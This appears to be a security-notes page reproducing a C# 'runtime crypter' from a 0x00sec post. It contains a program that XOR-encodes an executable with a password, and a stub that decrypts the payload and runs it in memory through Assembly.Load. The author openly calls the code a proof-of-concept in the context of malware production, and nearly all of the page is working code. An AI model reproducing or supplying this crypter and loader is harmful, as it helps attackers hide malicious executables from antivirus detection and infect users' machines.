# DotNET

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;

namespace Crypter
{
    class Program
    {

		private static byte[] encodeBytes(byte[] bytes, String pass) {
		    byte[] XorBytes = Encoding.Unicode.GetBytes(pass);
		
		    for (int i = 0; i < bytes.Length; i++) {
		        bytes[i] ^= XorBytes[i % 16];
		    }
		
		    return bytes;
		}
        static void Main(string[] args)
        {
            //No Arguments -> Exit
            if (args.Length < 2)
            {
                Console.WriteLine("Syntax: crypter.exe <Exe/Dll to get Encrypted> <Password> (Optional: output file name)");
                Environment.Exit(0);
            }

            String file = args[0];
            String pass = args[1];
            String outFile = "Crypted.exe";

            //If Output Name is specified -> Set it
            if (args.Length == 3)
            {
                outFile = args[2];
            }

            //File doesn't exist -> Exit
            if (!File.Exists(file))
            {
                Console.WriteLine("[!] The selected File doesn't exist!");
                Environment.Exit(0);
            }

            //Everything seems fine -> Reading bytes
            Console.WriteLine("[*] Reading Data...");
            byte[] plainBytes = File.ReadAllBytes(file);

            //Yep, got bytes -> Encoding
            Console.WriteLine("[*] Encoding Data...");
            byte[] encodedBytes = encodeBytes(plainBytes, pass);

            Console.Write("[*] Save to Output File... ");
            File.WriteAllBytes(outFile, encodedBytes);
            Console.WriteLine("Done!");

            Console.WriteLine("\n[*] File successfully encoded!");
        }
    }
}
```

## Source of the Stub

Itâ€™s a rather bad implementation, since you have to hard-code the filenames and the encryption password. Anyway, this is more of a proof-of-concept. C# is not very useful in the production of malware.

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;
using System.Text;
using System.Reflection;
using System.Diagnostics;

namespace Stub {
    static class Program {
        /// <summary>
        /// MAIN
        /// </summary>
        [STAThread]
        static void Main() {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());

            //Set Payload File and Password HERE
            RunInternalExe("Crypted.exe", "password");
        }

        private static void RunInternalExe(string exeName, String pass) {
            //Verify the Payload exists
            if (!File.Exists(exeName))
                return;

            //Read the raw bytes of the file
            byte[] resourcesBuffer = File.ReadAllBytes(exeName);

            //Decrypt bytes from payload
            byte[] decryptedBuffer = null;
            decryptedBuffer = decryptBytes(resourcesBuffer, pass);

            //If .NET executable -> Run
            if(Encoding.Unicode.GetString(decryptedBuffer).Contains("</assembly>"))
            {
                //Load the bytes as an assembly
                Assembly exeAssembly = Assembly.Load(decryptedBuffer);

                //Execute the assembly
                object[] parameters = new object[1];                //Don't know why but fixes TargetParameterCountException
                exeAssembly.EntryPoint.Invoke(null, parameters);
            }
        }

        /// <summary>
        /// Decrypt the Loaded Assembly Bytes
        /// </summary>
        /// <param name="payload"></param>
        /// <returns>Decrypted Bytes</returns>
        private static byte[] decryptBytes(byte[] bytes, String pass) {
            byte[] XorBytes = Encoding.Unicode.GetBytes(pass);

            for (int i = 0; i < bytes.Length; i++) {
                bytes[i] ^= XorBytes[i % 16];
            }

            return bytes;
        }
    }
}
```

---
## References

### 0x00sec

- [0x00sec: [C#] A Simple Runtime Crypter](https://0x00sec.org/t/c-a-simple-runtime-crypter/519/3)